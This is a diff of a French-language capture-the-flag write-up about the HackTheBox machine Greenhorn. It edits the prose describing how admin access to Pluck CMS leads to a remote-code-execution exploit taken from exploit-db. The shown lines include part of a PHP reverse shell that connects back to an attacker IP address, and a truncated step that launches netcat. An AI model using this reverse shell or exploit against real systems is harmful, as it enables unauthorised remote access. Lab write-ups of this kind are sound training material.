@@ -105,8 +105,8 @@ Avec ce mot de passe, on est capable d'accéder à l'admin panel de pluck
 http://greenhorn.htb/admin.php?action=start
 ```
 
-Une fois l'accès à l'admin panel confirmé, on utilise le mot de passe avec le RCE suivant:
-
+L'accès à l'admin panel est confirmé. 
+En fouillant un peu sur `exploit-db.com` on trouve le RCE suivant:
 [upload-reverse-shell.py](https://www.exploit-db.com/exploits/51592)
 ```python
 #Exploit Title: Pluck v4.7.18 - Remote Code Execution (RCE)
@@ -169,6 +169,7 @@ print(rce.text)
 ```
 
 Il ne reste plus qu'à créer le reverse-shell.zip avec le reverse-shell.php à l'intérieur pour être exécuté par le RCE:
+reverse-shell.php
 ```php
 <?php
 $ip = '10.10.14.174'; // change this to your IP address
@@ -189,3 +190,5 @@ if ($socket) {
 }
 ?>
 ```
+
+Puis, on lance netcat pour
